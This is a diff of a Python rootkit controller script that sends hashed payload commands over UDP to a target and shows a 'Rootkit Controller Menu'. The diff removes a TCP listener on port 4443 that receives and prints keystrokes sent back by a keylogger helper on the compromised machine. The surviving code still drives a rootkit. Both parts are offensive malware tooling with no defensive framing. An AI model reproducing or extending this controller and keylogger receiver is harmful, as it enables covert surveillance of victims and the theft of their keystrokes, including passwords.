@@ -17,7 +17,6 @@ payload_map = {
 # Config
 TARGET_UDP_HOST = '127.0.0.1'
 TARGET_UDP_PORT = 9000
-TARGET_TCP_PORT = 4443
 
 def fnv1a_hash(data):
     hash = 0x811c9dc5
@@ -58,31 +57,6 @@ def send_payload(option):
     except Exception as e:
         print(f"[-] Failed to send payload: {e}")
 
-def start_listener():
-    HOST = '0.0.0.0'
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_sock:
-        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server_sock.bind((HOST, TARGET_TCP_PORT))
-        server_sock.listen(5)
-        print(f"[+] Keylogger output listener active on {HOST}:{TARGET_TCP_PORT}")
-
-        while True:
-            client_sock, addr = server_sock.accept()
-            print(f"[+] Keylogger_sender helper connected from {addr}")
-            threading.Thread(target=handle_client, args=(client_sock,), daemon=True).start()
-
-def handle_client(client_sock):
-    with client_sock:
-        try:
-            while True:
-                data = client_sock.recv(4096)
-                if not data:
-                    break
-                print(data.decode('utf-8', errors='replace'), end='', flush=True)
-        except Exception as e:
-            print(f"[!] Client error: {e}")
-        print("\n[+] Client disconnected\n")
-
 def print_menu():
     print("\n==== Rootkit Controller Menu ====")
     for key, val in payload_map.items():
@@ -93,9 +67,6 @@ def print_menu():
     print("==================================")
 
 if __name__ == "__main__":
-    # Start TCP listener thread
-    threading.Thread(target=start_listener, daemon=True).start()
-
     sniffer_started = False
     while True:
         print_menu()
